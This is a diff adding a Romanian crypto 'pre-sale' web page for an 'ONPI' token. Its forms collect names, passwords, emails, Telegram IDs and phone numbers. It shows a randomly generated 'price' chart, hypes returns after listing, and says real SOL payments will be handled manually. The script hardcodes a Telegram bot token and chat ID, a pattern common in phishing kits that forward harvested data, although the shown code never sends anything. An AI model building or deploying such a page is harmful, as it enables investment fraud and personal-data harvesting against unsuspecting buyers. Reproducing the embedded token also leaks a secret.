@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ONPI Token Pre-Sale – Februarie 2026</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+
+  <style>
+    :root {
+      --bg: #0b0e11;
+      --card: #1e2329;
+      --text: #e6e6e6;
+      --gray: #9ca3af;
+      --primary: #f0b90b;
+      --primary-dark: #c99a0b;
+      --accent: #f6465d;
+      --green: #02c076;
+      --border: #2a2e36;
+      --success: #02c076;
+      --error: #f6465d;
+      --card-gradient: linear-gradient(135deg, #1e2329, #171b21);
+    }
+
+    * { margin:0; padding:0; box-sizing:border-box; }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      background: var(--card-gradient);
+      border-radius: 16px;
+      padding: 32px 24px;
+      width: 100%;
+      max-width: 480px;
+      border: 1px solid var(--border);
+      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+      margin: auto;
+    }
+
+    h1 {
+      font-family: 'Orbitron', sans-serif;
+      text-align: center;
+      color: var(--primary);
+      font-size: 2.2rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .subtitle {
+      text-align: center;
+      color: var(--gray);
+      font-size: 1.05rem;
+      margin-bottom: 2rem;
+    }
+
+    .form-group {
+      margin-bottom: 1.5rem;
+      position: relative;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      color: var(--primary);
+      font-weight: 600;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px 40px 14px 16px;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      background: #11151b;
+      color: white;
+      font-size: 1rem;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(240,185,11,0.3);
+    }
+
+    input::placeholder { color: var(--gray); }
+
+    .toggle-password {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 1.3rem;
+      color: var(--gray);
+    }
+
+    button {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 12px;
+      font-size: 1.2rem;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 1rem;
+      transition: all 0.2s;
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    button:not(.logout-btn):not(.btn-register):not([style*="background"]), 
+    .dashboard-btn:not(.logout-btn),
+    .withdraw-btn,
+    .package-card .btn-select:not(:disabled),
+    .btn-login,
+    .btn-telegram,
+    .wallet-btn {
+      background: var(--primary) !important;
+      color: #000 !important;
+    }
+
+    button:not(.logout-btn):not(.btn-register):not([style*="background"]):hover:not(:disabled), 
+    .dashboard-btn:not(.logout-btn):hover:not(:disabled),
+    .withdraw-btn:hover:not(:disabled),
+    .package-card .btn-select:not(:disabled):hover,
+    .btn-login:hover,
+    .btn-telegram:hover,
+    .wallet-btn:hover {
+      background: var(--primary-dark) !important;
+      transform: translateY(-2px);
+    }
+
+    .btn-register {
+      background: transparent;
+      border: 2px solid var(--primary);
+      color: var(--primary);
+    }
+
+    .logout-btn {
+      background: var(--error);
+      color: white;
+      grid-column: 1 / -1;
+    }
+
+    .status {
+      margin-top: 1.5rem;
+      padding: 14px;
+      border-radius: 12px;
+      text-align: center;
+      font-weight: 600;
+      display: none;
+    }
+
+    .success { background: rgba(2,192,118,0.2); color: var(--success); }
+    .error   { background: rgba(246,70,93,0.2); color: var(--error); }
+
+    .hidden { display: none !important; }
+
+    .sold-balance {
+      text-align: center;
+      font-size: 2.8rem;
+      font-weight: 800;
+      color: white;
+      margin: 2rem 0;
+      padding: 20px;
+      border-radius: 16px;
+      background: rgba(15,18,23,0.8);
+      border: 1px solid var(--primary);
+    }
+
+    .sold-balance .usd {
+      color: var(--primary);
+      font-size: 3.2rem;
+    }
+
+    .sold-balance .tokens {
+      display: block;
+      font-size: 1.4rem;
+      color: var(--gray);
+      margin-top: 0.5rem;
+    }
+
+    .dashboard-actions {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+      margin: 2rem 0;
+    }
+
+    .profile-section, .packages-page {
+      background: rgba(30, 35, 41, 0.8);
+      padding: 24px;
+      border-radius: 16px;
+      margin-top: 1.5rem;
+      border: 1px solid var(--border);
+    }
+
+    .package-list {
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+    }
+
+    .package-card {
+      background: rgba(30, 35, 41, 0.6);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+      transition: all 0.3s;
+      position: relative;
+    }
+
+    .package-card.expanded {
+      margin-bottom: 140px;
+    }
+
+    .package-card:hover {
+      border-color: var(--primary);
+      box-shadow: 0 0 20px rgba(240,185,11,0.2);
+      transform: translateY(-4px);
+    }
+
+    .package-card h3 {
+      color: var(--primary);
+      font-size: 1.6rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .package-card .price {
+      font-size: 2.2rem;
+      font-weight: 700;
+      color: white;
+    }
+
+    .package-card .tokens {
+      font-size: 1.3rem;
+      color: var(--green);
+      margin: 0.5rem 0;
+    }
+
+    .package-card .profit {
+      font-size: 1.1rem;
+      color: var(--gray);
+    }
+
+    .package-card .btn-select {
+      background: var(--primary);
+      color: #000;
+      margin-top: 1rem;
+      padding: 12px;
+      font-size: 1.1rem;
+      width: 100%;
+    }
+
+    .package-card .btn-select:disabled {
+      background: #4a5568 !important;
+      color: #cbd5e0 !important;
+      cursor: not-allowed;
+    }
+
+    .dropdown-menu {
+      position: relative;
+      margin-top: 1rem;
+      background: var(--card);
+      border: 1px solid var(--primary);
+      border-radius: 8px;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.5);
+      overflow: hidden;
+    }
+
+    .dropdown-menu button {
+      background: var(--primary);
+      color: #000;
+      border: none;
+      padding: 14px;
+      font-size: 1.1rem;
+      cursor: pointer;
+      width: 100%;
+      text-align: center;
+    }
+
+    .dropdown-menu button:hover {
+      background: var(--primary-dark);
+    }
+
+    @media (max-width: 480px) {
+      .container { padding: 24px 16px; }
+      h1 { font-size: 1.9rem; }
+      .sold-balance { font-size: 2.2rem; }
+      .sold-balance .usd { font-size: 2.6rem; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- PAGINA DE LOGIN -->
+<div class="container" id="loginPage">
+  <h1>ONPI Token</h1>
+  <p class="subtitle">Conectează-te pentru a continua pre-sale</p>
+
+  <form id="loginForm">
+    <div class="form-group">
+      <label for="loginCont">Cont (Username)</label>
+      <input type="text" id="loginCont" required placeholder="numele_tău">
+    </div>
+
+    <div class="form-group password-group">
+      <label for="loginParola">Parolă</label>
+      <input type="password" id="loginParola" required minlength="6">
+      <span class="toggle-password" onclick="togglePassword('loginParola')">👁</span>
+    </div>
+
+    <button type="submit" class="btn-login">Login</button>
+  </form>
+
+  <button class="btn-register" onclick="switchToRegister()">Înregistrează-te</button>
+
+  <div id="loginStatus" class="status"></div>
+</div>
+
+<!-- PAGINA DE ÎNREGISTRARE -->
+<div class="container hidden" id="registerPage">
+  <h1>ONPI Token</h1>
+  <p class="subtitle">Creează-ți contul pentru pre-sale</p>
+
+  <form id="registerForm">
+    <div class="form-group">
+      <label for="nume">Nume complet</label>
+      <input type="text" id="nume" required placeholder="Ion Popescu" minlength="3">
+    </div>
+
+    <div class="form-group">
+      <label for="cont">Cont (Username)</label>
+      <input type="text" id="cont" required placeholder="numele_tău (doar litere mici, cifre, ._-)" minlength="4">
+    </div>
+
+    <div class="form-group password-group">
+      <label for="parola">Parolă</label>
+      <input type="password" id="parola" required minlength="6" placeholder="Minimum 6 caractere">
+      <span class="toggle-password" onclick="togglePassword('parola')">👁</span>
+    </div>
+
+    <div class="form-group password-group">
+      <label for="confirmParola">Confirmă parolă</label>
+      <input type="password" id="confirmParola" required minlength="6" placeholder="Reintrodu parolă">
+      <span class="toggle-password" onclick="togglePassword('confirmParola')">👁</span>
+    </div>
+
+    <div class="form-group">
+      <label for="email">Adresă de email</label>
+      <input type="email" id="email" required placeholder="exemplu@gmail.com">
+    </div>
+
+    <div class="form-group">
+      <label for="telegram">ID Telegram</label>
+      <input type="text" id="telegram" required placeholder="@numele_tău">
+    </div>
+
+    <div class="form-group">
+      <label for="telefon">Număr de telefon</label>
+      <input type="tel" id="telefon" required placeholder="+40 712 345 678">
+    </div>
+
+    <div class="terms">
+      Prin apăsarea butonului confirm că accept termenii și politica de confidențialitate.
+    </div>
+
+    <button type="submit">Înregistrează-mă</button>
+  </form>
+
+  <button class="switch-btn" onclick="switchToLogin()">Am deja cont? → Login</button>
+
+  <div id="status" class="status"></div>
+</div>
+
+<!-- DASHBOARD -->
+<div class="container hidden" id="dashboardPage">
+  <h1 class="dashboard-welcome">Dashboard ONPI</h1>
+
+  <div style="background:rgba(246,70,93,0.2); border:1px solid var(--accent); color:var(--accent); padding:16px; border-radius:12px; margin-bottom:1.5rem; text-align:center; font-weight:600;">
+    <strong>PRE-SALE ÎN CURS – Februarie 2026</strong><br>
+    Toate achizițiile sunt simulate în browser.<br>
+    Plata reală SOL se va procesa manual după închiderea rundei.
+  </div>
+
+  <div class="sold-balance">
+    <span class="usd" id="dashSoldValue">0</span> $
+    <span class="tokens">Sold ONPI: <span id="dashSold">0</span></span>
+  </div>
+
+  <div class="sold-balance" style="margin-top:1rem; border-color:var(--green);">
+    <span style="color:var(--green);">Stake activ: <span id="dashStakeSold">0</span> ONPI</span>
+  </div>
+
+  <button class="withdraw-btn" onclick="goToWithdrawal()">Retragere</button>
+
+  <div class="dashboard-actions">
+    <button class="dashboard-btn profile-btn" onclick="openProfile()">👤 Profil</button>
+    <button class="dashboard-btn password-btn" onclick="changePassword()">🔐 Schimbă parolă</button>
+    <button id="btnPackages" class="dashboard-btn packages-btn" onclick="openPackages(false)">📦 Pachete</button>
+    <button id="btnChangePackage" class="dashboard-btn change-package-btn" onclick="openPackages(true)">🔄 Adaugă pachet</button>
+    <button class="dashboard-btn stake-btn" onclick="openStake()">💰 Stake ONPI</button>
+    <button class="dashboard-btn instructions-btn" onclick="openInstructions()">📖 Instrucțiuni</button>
+    <button class="dashboard-btn logout-btn" onclick="logout()">🚪 Deconectare</button>
+  </div>
+
+  <div style="margin-top:2rem; padding:20px; background:rgba(30,35,41,0.8); border-radius:16px; border:1px solid var(--primary); height:320px;">
+    <h3 style="text-align:center; color:var(--primary); margin-bottom:1rem;">Evoluție preț ONPI (ultimele 24h)</h3>
+    <canvas id="priceChart" height="220"></canvas>
+  </div>
+
+  <div id="dashboardStatus" class="status"></div>
+</div>
+
+<!-- PROFIL -->
+<div class="container hidden" id="profilePage">
+  <h1>Profilul meu</h1>
+
+  <div class="profile-section">
+    <p><strong>Nume complet:</strong> <span id="dashNume">—</span></p>
+    <p><strong>Cont (Username):</strong> <span id="dashCont">—</span></p>
+    <p><strong>Email:</strong> <span id="dashEmail">—</span></p>
+    <p><strong>Telegram ID:</strong> <span id="dashTelegram">—</span></p>
+    <p><strong>Telefon:</strong> <span id="dashTelefon">—</span></p>
+    <p><strong>Data înregistrării:</strong> <span id="dashDataInregistrare">—</span></p>
+    <p><strong>Sold ONPI:</strong> <span id="dashSoldPersonal">0</span> ONPI</p>
+    <p><strong>Sold Stake:</strong> <span id="dashStakePersonal">0</span> ONPI</p>
+    <p><strong>Pachete cumpărate:</strong> <span id="dashPachete">0</span></p>
+    <p><strong>Pachet activ:</strong> <span id="dashActivePackage">—</span></p>
+    <p><strong>Status cont:</strong> <span id="dashStatus">Activ</span></p>
+    <p><strong>Adresa wallet Solana:</strong> <span id="dashWallet">— (nu ai adăugat încă)</span></p>
+  </div>
+
+  <div style="margin-top:2rem;">
+    <button onclick="addWallet()" style="background:var(--primary); color:black; padding:16px; font-size:1.2rem;">
+      Adaugă / Modifică wallet Solana
+    </button>
+  </div>
+
+  <button onclick="switchToDashboard()" style="margin-top:1.5rem;">Înapoi la dashboard</button>
+</div>
+
+<!-- PACHETE -->
+<div class="container hidden" id="packagesPage">
+  <h1>Pachete disponibile</h1>
+  <p class="subtitle">Alege pachetul potrivit pentru tine (pre-sale)</p>
+
+  <div class="package-list">
+    <div class="package-card" id="card1">
+      <h3>Basic</h3>
+      <div class="price">50$</div>
+      <div class="tokens">7.500.000 ONPI (\~<span id="solEq50">calculând...</span> SOL)</div>
+      <div class="profit">Potențial multiplicare după listare</div>
+      <div class="dropdown-wrapper">
+        <button class="btn-select" onclick="toggleDropdown('card1')">Selectează</button>
+        <div class="dropdown-menu" id="dropdown1">
+          <button onclick="buyPackage('50')">Adaugă în pre-sale</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Adaugă manual celelalte 3 carduri (Standard, Premium, Elite) aici dacă vrei -->
+    <!-- Exemplu pentru Standard -->
+    <div class="package-card" id="card2">
+      <h3>Standard</h3>
+      <div class="price">100$</div>
+      <div class="tokens">15.000.000 ONPI (\~<span id="solEq100">calculând...</span> SOL)</div>
+      <div class="profit">Potențial multiplicare după listare</div>
+      <div class="dropdown-wrapper">
+        <button class="btn-select" onclick="toggleDropdown('card2')">Selectează</button>
+        <div class="dropdown-menu" id="dropdown2">
+          <button onclick="buyPackage('100')">Adaugă în pre-sale</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ... adaugă Premium și Elite la fel dacă vrei complet ... -->
+  </div>
+
+  <button onclick="switchToDashboard()" style="margin-top:2rem;">Înapoi la dashboard</button>
+</div>
+
+<!-- SCRIPT -->
+<script>
+  // ──────────────────────────────────────────────
+  // JavaScript complet – simulare pre-sale
+  // ──────────────────────────────────────────────
+
+  const BOT_TOKEN = '7548290162:AAH0P6XOowBMHvKIggPT-pafIg6RDI3Qj-c';
+  const CHAT_ID   = '5470225717';
+
+  const packages = {
+    '50':  7500000,
+    '100': 15000000,
+    '200': 30000000,
+    '500': 60000000
+  };
+
+  let upgradeMode = false;
+  let priceChart;
+
+  // Elemente DOM principale (cele folosite)
+  const loginPage = document.getElementById('loginPage');
+  const registerPage = document.getElementById('registerPage');
+  const dashboardPage = document.getElementById('dashboardPage');
+  const profilePage = document.getElementById('profilePage');
+  const packagesPage = document.getElementById('packagesPage');
+
+  // Funcții de navigare simplificate
+  function showOnly(page) {
+    [loginPage, registerPage, dashboardPage, profilePage, packagesPage].forEach(p => {
+      if (p) p.classList.add('hidden');
+    });
+    if (page) page.classList.remove('hidden');
+  }
+
+  function togglePassword(fieldId) {
+    const field = document.getElementById(fieldId);
+    const icon = field.nextElementSibling;
+    field.type = field.type === 'password' ? 'text' : 'password';
+    icon.textContent = field.type === 'password' ? '👁' : '🙈';
+  }
+
+  function switchToLogin() { showOnly(loginPage); }
+  function switchToRegister() { showOnly(registerPage); }
+  function switchToDashboard() { 
+    showOnly(dashboardPage); 
+    if (!priceChart) initChart(); 
+  }
+
+  function openProfile() { showOnly(profilePage); }
+  function openPackages() { showOnly(packagesPage); }
+  function logout() {
+    localStorage.removeItem('loggedInUser');
+    showOnly(loginPage);
+  }
+
+  // Login simulare
+  document.getElementById('loginForm')?.addEventListener('submit', e => {
+    e.preventDefault();
+    const username = document.getElementById('loginCont')?.value.trim();
+    if (username) {
+      localStorage.setItem('loggedInUser', username);
+      switchToDashboard();
+    }
+  });
+
+  // Register simulare
+  document.getElementById('registerForm')?.addEventListener('submit', e => {
+    e.preventDefault();
+    const username = document.getElementById('cont')?.value.trim();
+    if (username) {
+      localStorage.setItem('loggedInUser', username);
+      switchToDashboard();
+    }
+  });
+
+  // Preț SOL live
+  async function getSolPrice() {
+    try {
+      const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
+      const data = await res.json();
+      return data.solana.usd || 150;
+    } catch {
+      return 150;
+    }
+  }
+
+  async function updateSolEquivalents() {
+    const solPrice = await getSolPrice();
+    ['50','100','200','500'].forEach(v => {
+      const el = document.getElementById(`solEq${v}`);
+      if (el) el.textContent = (v / solPrice).toFixed(4);
+    });
+  }
+
+  // Cumpărare simulată
+  async function buyPackage(value) {
+    const amount = parseInt(value);
+    const tokens = packages[amount] || 0;
+    if (tokens === 0) return alert('Pachet invalid!');
+
+    const solPrice = await getSolPrice();
+    const solEq = (amount / solPrice).toFixed(4);
+
+    alert(
+      `PRE-SALE SIMULATĂ\n` +
+      `Pachet: \( {amount} \) ≈ ${solEq} SOL\n` +
+      `Primești: ${tokens.toLocaleString('ro-RO')} ONPI\n\n` +
+      `Sold fictiv actualizat în browser.`
+    );
+
+    // Crește sold fictiv
+    let balance = parseInt(localStorage.getItem('balance') || '0');
+    balance += tokens;
+    localStorage.setItem('balance', balance);
+    document.getElementById('dashSold').textContent = balance.toLocaleString('ro-RO');
+  }
+
+  // Grafic fictiv
+  function initChart() {
+    const ctx = document.getElementById('priceChart')?.getContext('2d');
+    if (!ctx) return;
+
+    priceChart = new Chart(ctx, {
+      type: 'line',
+      data: {
+        labels: ['1h', '2h', '3h', '4h', '5h', '6h', '7h', '8h', '9h', '10h', '11h', '12h', '13h', '14h', '15h', '16h', '17h', '18h', '19h', '20h', '21h', '22h', '23h', '24h'],
+        datasets: [{
+          label: 'Preț fictiv ONPI ($)',
+          data: Array(24).fill(0).map(() => 0.000001 + Math.random() * 0.0000005),
+          borderColor: 'rgba(240, 185, 11, 1)',
+          backgroundColor: 'rgba(240, 185, 11, 0.2)',
+          tension: 0.4,
+          fill: true
+        }]
+      },
+      options: {
+        responsive: true,
+        maintainAspectRatio: false,
+        scales: {
+          y: { beginAtZero: true }
+        }
+      }
+    });
+  }
+
+  // Încărcare inițială
+  window.addEventListener('load', async () => {
+    const loggedInUser = localStorage.getItem('loggedInUser');
+    if (loggedInUser) {
+      document.getElementById('loginPage').classList.add('hidden');
+      document.getElementById('dashboardPage').classList.remove('hidden');
+      initChart();
+    }
+    await updateSolEquivalents();
+  });
+</script>
+</body>
+</html> 
